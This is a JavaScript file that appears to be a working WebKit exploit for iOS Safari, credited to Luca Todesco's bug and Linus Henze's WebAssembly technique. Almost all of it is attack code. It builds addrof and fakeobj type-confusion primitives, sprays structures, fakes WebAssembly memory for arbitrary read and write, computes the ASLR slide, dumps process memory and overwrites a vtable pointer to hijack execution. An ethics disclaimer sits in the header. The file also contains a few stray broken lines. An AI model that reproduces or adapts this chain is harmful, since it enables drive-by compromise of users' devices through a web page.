/*
 * This code is taken from a GitHub user that I sadly forgot the name of.
 * The code exploits a vulnerability discovered in WebKit by Luca Todesco.
 * Rumours are that it has been patched after iOS 13 beta 2.
 * Exploit primitives are gained eventually using Linus Henze's method with WebAssembly.
 * It is under no circumstance justified to alter or reuse the code for the harm of innocent users or counter-intelligence.
 * The purpose of this exploit is to demonstrate the impact of zero- and one-click exploits and to run mach_swap without any codesignature requirements.
*/
var VM_PROT_NONE = 0
var VM_PROT_READ = 1
var VM_PROT_WRITE = 2
var VM_PROT_EXECUTE = 4
var VM_PROT_NO_CHANGE = 8
var VM_PROT_COPY = 16
function sleep(seconds){
    var waitUntil = new Date().getTime() + seconds*1000;
    while(new Date().getTime() < waitUntil) true;
}
function GetErrorCount(){
    return document.getElementsByClassName("error").length;
}
function b2u32(b){
    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
}
function hexdump(buffer, blockSize, base) {
    blockSize = blockSize || 16;
    var lines = [];
    var hex = "0123456789ABCDEF";
    for (var b = 0; b < buffer.length; b += blockSize) {
        var block = buffer.slice(b, Math.min(b + blockSize, buffer.length));
        var addr = Add(base,new Int64('0x'+("0000" + b.toString(16)).slice(-4))).toString(16);
        var codes = block.split('').map(function (ch) {
            var code = ch.charCodeAt(0);
            return " " + hex[(0xF0 & code) >> 4] + hex[0x0F & code];
        }).join("");
        codes += "   ".repeat(blockSize - block.length);
        var chars = block.replace(/[\x00-\x1F\x20]/g, '.');
        chars +=  " ".repeat(blockSize - block.length);
        lines.push(addr + " " + codes + "  " + chars);
    }
    return lines.join("<br/>");
}
function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            return false;
        }
    }
    return fn(str.length) == 0;
}
function makeJITCompiledFunction() {
    function target(x) {
        return x;
    }
    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}
function exploit(){
    var a = [13.37, 13.37];
    a[0] = {};
    var fixup = null;
    var referenceFloat64Array = new Float64Array(0x1000);
    function str2ab(str) {
        var array = new Uint8Array(str.length);
        for(var i = 0; i < str.length; i++) {
            array[i] = str.charCodeAt(i);
        }
        return array.buffer
    }
    // adjusted copy paste from: http://rce.party/wtf.js
    // they failed to model a lot of objects,
    // so we can abuse this to make addrof once and fakeobj 2 times..
    // altought this can be written nicer..
    function __addrof(val){
        let s = new Error();
        let confuse = new Array(13.37,13.37);
        s[1] = 1;
        let hack = 0;
        Error.prototype.__proto__ = new Proxy(Error.prototype.__proto__, {has: function() {
            if (hack) {
                confuse[0] = val;
            }
        }});
        function victim(oj,f64,u32,doubleArray,high) {
            doubleArray[0];
            let r = 5 in oj;
            f64[0] = f64[1] = doubleArray[0];
            u32[3] = high;
            doubleArray[0] = f64[0];
            return r;
        }
        let u32 = new Uint32Array(4);
        let f64 = new Float64Array(u32.buffer);
        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse,0);
        hack = 1;
        victim(s,f64,u32,confuse,0);
        let add = (u32[0]+u32[1]*0x100000000);
            
        let h = (u32[0]+u32[1]*0x100000000).toString(16)[0]
        victim(s,f64,u32,confuse,h);
        return add;
    }
    function addrof2(val){
        let s = new Function();
        let confuse = new Array(13.37,13.37);
        s[1] = 1;
        let hack = 0;
        Function.prototype.__proto__ = new Proxy(Function.prototype.__proto__, {has: function() {
            if (hack) {
                confuse[0] = val;
            }
        }});
        function victim(oj,f64,u32,doubleArray,high) {
            doubleArray[0];
            let r = 5 in oj;
            f64[0] = f64[1] = doubleArray[0];
            u32[3] = high;
            doubleArray[0] = f64[0];
            return r;
        }
        let u32 = new Uint32Array(4);
        let f64 = new Float64Array(u32.buffer);
        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse,0);
        hack = 1;
        victim(s,f64,u32,confuse,0);
        let add = (u32[0]+u32[1]*0x100000000);
            
        let h = (u32[0]+u32[1]*0x100000000).toString(16)[0]
        fixup = h;
        victim(s,f64,u32,confuse,h);
        return add;
    }
    function fake_obj_at_address(where,high){
        let s = new Date();
        let confuse = new Array(13.37,13.37);
        s[1] = 1;
        let hack = 0;
        Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {has: function() {
            if (hack) {
                confuse[1] = {};
            }
        }});
        function victim(oj,f64,u32,doubleArray) {
            doubleArray[0];
            let r = 5 in oj;
            f64[0] = f64[1] = doubleArray[1];
            
            u32[3] = high;
            u32[2] = where;
            doubleArray[1] = f64[1];
            return r;
        }
        let u32 = new Uint32Array(4);
        let f64 = new Float64Array(u32.buffer);
        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse);
        hack = 1;
        victim(s,f64,u32,confuse);
        return confuse[1];
    }
    function fake_obj_at_address2(where,high){
        let s = new Intl.Collator();
        let confuse = new Array(13.37,13.37);
        s[0] = 1;
        let hack = 0;
        Intl.Collator.prototype.__proto__ = new Proxy(Intl.Collator.prototype.__proto__, {has: function() {
            if (hack) {
                confuse[1] = {};
            }
        }});
        function victim(oj,f64,u32,doubleArray) {
            doubleArray[0];
            let r = 5 in oj;
            f64[0] = f64[1] = doubleArray[1];
            u32[3] = high;
            u32[2] = where;
            doubleArray[1] = f64[1];
            return r;
        }
        let u32 = new Uint32Array(4);
        let f64 = new Float64Array(u32.buffer);
        for(let i=0; i<10000; i++) victim(s,f64,u32,confuse);
        hack = 1;
        victim(s,f64,u32,confuse);
            
        return confuse[1];
    }
    function pwn()
    {
        alert("starting");
        log('[*] Spraying structures to get a butterfly (1/2)...');
        // copy paste from:
        // https://github.com/LinusHenze/WebKit-RegEx-Exploit
        var structs = [];
        for (var i = 0; i < 0x10; i++) {
            var a = new Float64Array(1);
            a['prop' + i] = 1337;
            structs.push(a);
        }
        
        log('[*] Spraying structures to get a butterfly (2/2)...');
        for (var i = 0; i < 10000; i++) {
            var a = new WebAssembly.Memory({inital: 0});
            a['prop' + i] = 1337;
            structs.push(a);
        }
        
        log('[*] Preparing R/W primitives...');
        
        var webAssemblyCode = '\x00asm\x01\x00\x00\x00\x01\x0b\x02`\x01\x7f\x01\x7f`\x02\x7f\x7f\x00\x02\x10\x01\x07imports\x03mem\x02\x00\x02\x03\x07\x06\x00\x01\x00\x01\x00\x01\x07D\x06\x08read_i32\x00\x00\twrite_i32\x00\x01\x08read_i16\x00\x02\twrite_i16\x00\x03\x07read_i8\x00\x04\x08write_i8\x00\x05\nF\x06\x0b\x00 \x00A\x04l(\x02\x00\x0f\x0b\x0c\x00 \x00A\x04l \x016\x02\x00\x0b\x0b\x00 \x00A\x02l/\x01\x00\x0f\x0b\x0c\x00 \x00A\x02l \x01;\x01\x00\x0b\x08\x00 \x00-\x00\x00\x0f\x0b\t\x00 \x00 \x01:\x00\x00\x0b';
        var webAssemblyBuffer = str2ab(webAssemblyCode);
        var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
        
        var jsCellHeader = new Int64([
            0x00, 0x10, 0x00, 0x00,
            0x0,
            0x2c,
            0x08,
            0x1
        ]);
        
        var wasmBuffer = {
            jsCellHeader: jsCellHeader.asJSValue(),
            butterfly: null,
            vector: null,
            memory: null,
            deleteMe: null
        };
        
        var wasmInternalMemory = {
            jsCellHeader: null,
            memoryToRead: {},
            sizeToRead: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(),
            size: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(),
            initialSize: (new Int64('0x0FFFFFFFFFFFFFFF')).asJSValue(),
            junk1: null,
            junk2: null,
            junk3: null,
            junk4: null,
            junk5: null,
        };
        
        var leaker = {
            objectToLeak: null
        };
        let fail = function fail(x)
    {
        alert('FAIL: ' + x);
        location.reload();
        throw null;
    }
        delete wasmBuffer.butterfly;
        delete wasmBuffer.vector;
        delete wasmBuffer.deleteMe;
        delete wasmInternalMemory.junk1;
        delete wasmInternalMemory.junk2;
        delete wasmInternalMemory.junk3;
        delete wasmInternalMemory.junk4;
        delete wasmInternalMemory.junk5;
        
        var realWasmMem = new WebAssembly.Memory({inital: 0x1});
        sleep(5);
        var wasmBufferRawAddr = addrof2(wasmBuffer);
        if (wasmBufferRawAddr == 0x7ff8000000000000) {
            //log("[+] Got A NAN address which invalid reloading");
            fail("[+] Got A NAN address which invalid reloading");
        }
        log('[+] Got WebAssembly buffer at 0x'+wasmBufferRawAddr.toString(16));
        let h = new Int64(wasmBufferRawAddr).toString()[9];
        var fakeWasmBuffer = fake_obj_at_address(wasmBufferRawAddr+16,parseInt(h));
        var maxtry = 0;
        if (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
        while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
            wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
            maxtry++;
            if (maxtry == 500) {
                fail("500 tries on getting valid structid failed!!!");
            }
        }
    } else {
        log('[+] Successfully got fakeobj as WASMObject');
    }
        
        var wasmMemRawAddr = __addrof(wasmInternalMemory);
        var wasmMem = fake_obj_at_address2(wasmMemRawAddr+16,parseInt(h));
        
        wasmBuffer.memory = wasmMem;
        
        var importObject = {
            imports: {
                mem: fakeWasmBuffer
            }
        };
        
        log('[*] We now have early R/W primitives that should work with the WASM memory...');
        
        function read_i64(readingFunc, offset) {
            var low = readingFunc(offset * 4);
            var midLow = readingFunc((offset * 4) + 1);
            var midHigh = readingFunc((offset * 4) + 2);
            var high = readingFunc((offset * 4) + 3);
            return Add(ShiftLeft(Add(ShiftLeft(Add(ShiftLeft(high, 2), midHigh), 2), midLow), 2), low);
        }
        function write_i64(writingFunc, offset, value) {
            writingFunc(offset * 4, ShiftRight(value, 0).asInt16());
            writingFunc((offset * 4) + 1, ShiftRight(value, 2).asInt16());
            writingFunc((offset * 4) + 2, ShiftRight(value, 4).asInt16());
            writingFunc((offset * 4) + 3, ShiftRight(value, 6).asInt16());
        }
        
        function createObjWriter(obj) {
            wasmInternalMemory.memoryToRead = obj;
            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
        }
    
        
        var fakeWasmInternalBufferWriter = createObjWriter(wasmMem);
        var wasmInternalBufferWriter = fakeWasmInternalBufferWriter;
        
        function createDirectWriter(address) {
            wasmInternalBufferWriter.write_i64(1, address);
            var module = new WebAssembly.Instance(webAssemblyModule, importObject);
            return {read_i8: module.exports.read_i8, write_i8: module.exports.write_i8, read_i16: module.exports.read_i16, write_i16: module.exports.write_i16, read_i32: module.exports.read_i32, write_i32: module.exports.write_i32, read_i64: read_i64.bind(null, module.exports.read_i16), write_i64: write_i64.bind(null, module.exports.write_i16), module: module}
        }
        
        var realWasmWriter = createObjWriter(realWasmMem);
        var realWasmInternalMemAddr = realWasmWriter.read_i64(3);
        wasmInternalBufferWriter = createDirectWriter(realWasmInternalMemAddr);
        /*for (var z = 0; z < 10000; z++) {
            var chewjittime = [0x7fff000000000000];
            chewjittime[1] = {a:0x41312111};
        }*/
        var leakerWriter = createObjWriter(leaker);
        wasmInternalBufferWriter.write_i64(2, new Int64('0x0FFFFFFFFFFFFFFF'));
        wasmInternalBufferWriter.write_i64(3, new Int64('0x0FFFFFFFFFFFFFFF'));
        wasmInternalBufferWriter.write_i64(4, new Int64('0x0FFFFFFFFFFFFFFF'));
        var realInternalBufferAddr = wasmInternalBufferWriter.read_i64(1);
        importObject.imports.mem = realWasmMem;
        
        addrof = function(obj) {
            leaker.objectToLeak = obj;
            return leakerWriter.read_i64(2);
        }
        
        fakeobj = function(addr) {
            leakerWriter.write_i64(2, addr);
            return leaker.objectToLeak;
        }
        
        createObjWriter = function(obj) {
            return createDirectWriter(addrof(obj));
        }
        
        var writer = createObjWriter(wasmMem);
        writer.write_i64(0, Int64.One);
        var wasmBufferWriter = createObjWriter(wasmBuffer);
        var writer = createObjWriter(wasmInternalMemory);
        wasmBufferWriter.write_i64(0, new Int64('0x0000000000000007'));
        wasmBufferWriter.write_i64(2, new Int64('0x0000000000000007'));
        
        writer.write_i64(4, Int64.Zero);
        writer.write_i64(5, Int64.Zero);
        writer.write_i64(6, Int64.Zero);
        writer.write_i64(7, Int64.Zero);
        writer.write_i64(0, new Int64('0x0000000000000007'));
        writer.write_i64(2, new Int64('0x0000000000000007'));
        
        log('[*] We now have stable R/W primitives, hooray!');
        var memory = {
            create_writer: function(addrObj) {
                if (addrObj instanceof Int64) {
                    var writer = createDirectWriter(addrObj);
                    return writer;
                } else {
                    var writer = createObjWriter(addrObj);
                    return writer;
                }
            },
            read_i64: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return writer.read_i64(offset);
            },
            write_i64: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i64(offset, value);
            },
            read_i32: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return new Int64(writer.read_i32(offset));
            },
            write_i32: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i32(offset, value);
            },
            read_i8: function(addrObj, offset) {
                var writer = this.create_writer(addrObj);
                return writer.read_i8(offset);
            },
            write_i8: function(addrObj, offset, value) {
                var writer = this.create_writer(addrObj);
                writer.write_i8(offset, value);
            },
            copyto: function(addrObj, offset, data, length) {
                var writer = this.create_writer(addrObj);
                for (var i = 0; i < length; i++) {
                    writer.write_i8(offset + i, data[i]);
                }
            },
            copyfrom: function(addrObj, offset, length) {
                var writer = this.create_writer(addrObj);
                var arr = new Uint8Array(length);
                for (var i = 0; i < length; i++) {
                    arr[i] = writer.read_i8(offset + i);
                }
                return arr;
            }
        }
        var r32 = function(addr){
            addr= new Int64(addr);
            return new Int64('0x'+memory.read_i8(Add(addr, 3)).toString(16) + memory.read_i8(Add(addr, 2)).toString(16) + memory.read_i8(Add(addr, 1)).toString(16) + memory.read_i8(addr).toString(16));
        };
        log('[*] Creating the HTMLDivElement wrapper...');
        var d = document.createElement('div');
        let ad_div = addrof(d);
        log('[+] Address of the div is '+ad_div.toString(16));
        let exe_ptr = memory.read_i64(Add(ad_div, new Int64('0x18')),0);
        log('[+] Executable instance is at '+exe_ptr.toString(16));
        let v_tlb = memory.read_i64(exe_ptr,0);
        log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
        let cnt = 0;
        var ccc = 0;
        var vtab = 0x1B205A808;
        var slide = Sub(v_tlb, vtab);
        log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
        var base = Add(new Int64('0x1881BD000'), slide);
        log('[+] And thus the JavaScriptCore base is '+base.toString(16));
        //var magic =  r32(base);
        //log('[+] Which has magic '+magic.toString(16));
        log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
        tmp = base;
        var dcache_base = Add(0x180000000,slide);
        var dcache_dump = String.fromCharCode(...memory.copyfrom(dcache_base, 0, 500)); //dump first 100-bytes
        log('[+] Dumping dyld shared cache...');
        log(hexdump(dcache_dump, 8, dcache_base));
        var dcache_base_seg = null;
        var dcache_nsegs = memory.read_i32(base + 0x14);
        log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
        var dcache_segdata = memory.copyfrom(Add(dcache_base, memory.read_i32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
        var dcache_segs = [];
        for(var i = 0; i < dcache_nsegs; i++){
            var off = i * 0x20;
            var seg = {
                addr:     new Int64(dcache_segdata.slice(off +  0x0, off +  0x8)),
                size:     new Int64(dcache_segdata.slice(off +  0x8, off + 0x10)),
                fileoff:  new Int64(dcache_segdata.slice(off + 0x10, off + 0x18)),
                maxprot:  b2u32(dcache_segdata.slice(off + 0x18, off + 0x1c)),
                initprot: b2u32(dcache_segdata.slice(off + 0x1c, off + 0x20))
            };
            dcache_segs.push(seg);
            var max_rights = "";
            var init_rights = "";
            if(seg.maxprot & VM_PROT_NONE){
                max_rights += "-";
            }
            if(seg.maxprot & VM_PROT_READ) {
                max_rights += "r";
            }
            if(seg.maxprot & VM_PROT_WRITE) {
                max_rights += "w";
            }
            if(seg.maxprot & VM_PROT_EXECUTE){
                max_rights += "x";
            }
            if(seg.initprot & VM_PROT_NONE){
                init_rights += "-";
            }
            if(seg.initprot & VM_PROT_READ) {
                init_rights += "r";
            }
            if(seg.initprot & VM_PROT_WRITE) {
                init_rights += "w";
            }
            if(seg.initprot & VM_PROT_EXECUTE){
                init_rights += "x";
            }
            if(max_rights.length < 4){
                max_rights = "-" + max_rights;
            }
            if(init_rights.length < 4){
                init_rights = "-" + init_rights;
            }
            
            log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
        }
        
        // you can also dump
        // the modules from memory here,
        // to compute gadgets later on..
       for (let i = 0; i < 10000; i++){
            
            cnt += 0x8;
            tmp = Add(tmp, new Int64('0x8'));
            let tmp_mem2 = memory.read_i64(tmp,0);
            let str = new Int64(tmp_mem2).toString();
            if (str.includes('00000000')                // execute the WebCore+0x8 illegal instruction..
                ){
               
               // d.dispatchEvent(new Event('click'));
               log("[+] We found the illegal instruction at "+tmp.toString(16)+" and will jump there in 10 seconds.");
               memory.write_i64(v_tlb,0,Add(new Int64('0x1800C1888'), slide)); // Putchar
               setInterval(function(el){el.dispatchEvent(new Event('click'));}, 10000, d);
               set
               success = 0;
               break;
            }
                        
        }        
    }
    var success = 2;
        try{
        pwn();
    }
    catch(yyy){
        fail('Error: ' + yyy + (yyy != null ? '\n' + yyy.stack : ''));
    }
    if (success == 0) {
        log("Script completed with "+ GetErrorCount() + " error(s).", LOG_INFO);
    } else {
        fail("failed");
    }
}
